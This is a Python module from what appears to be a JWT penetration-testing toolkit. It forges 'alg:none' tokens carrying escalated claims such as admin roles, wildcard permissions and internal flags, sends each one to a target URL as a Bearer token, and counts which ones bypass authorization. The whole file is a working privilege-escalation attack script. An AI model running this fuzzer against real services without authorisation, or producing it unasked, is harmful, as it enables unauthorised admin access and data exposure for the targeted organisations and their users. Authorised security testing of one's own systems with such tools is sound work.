import requests
import json
from utils import print_info, print_success, print_error, C
import forge_claims # Re-use forging logic

def run(token: str, target: str):
    print_info(f"Starting Authorization Fuzzer against {target}")
    
    mutations = [
        {"role": "admin"},
        {"role": "administrator"},
        {"role": "superadmin"},
        {"permissions": ["*"]},
        {"permissions": ["read", "write", "admin"]},
        {"scope": "*"},
        {"scope": "admin"},
        {"internal": True},
        {"internal": "true"},
        {"tier": "enterprise"},
        {"level": 999}
    ]
    
    successes = 0
    
    for mutation in mutations:
        # Forge with alg:none (assuming vulnerable endpoint for fuzzing purposes)
        try:
            forged_token = forge_claims.forge_none(token, mutation)
        except Exception as e:
            print_error(f"Failed to forge token: {e}")
            continue
            
        print_info(f"Testing mutation: {json.dumps(mutation)}")
        try:
            resp = requests.get(
                target,
                headers={"Authorization": f"Bearer {forged_token}"},
                timeout=5
            )
            
            if resp.status_code in [200, 201, 202]:
                print_success(f"Bypass successful! Status: {resp.status_code}")
                print(f"    Response: {resp.text.strip()[:100]}")
                successes += 1
            elif resp.status_code == 403:
                print_error(f"Forbidden (403) - Authorization Boundary Enforced.")
            elif resp.status_code == 401:
                print_error(f"Unauthorized (401) - Authentication Boundary Enforced (Signature Rejected?).")
            else:
                print(f"    Status: {resp.status_code}")
                
        except requests.ConnectionError:
            print_error(f"Failed to connect to {target}")
            break
            
    print_info(f"Fuzzing complete. Successful bypasses: {successes}/{len(mutations)}")
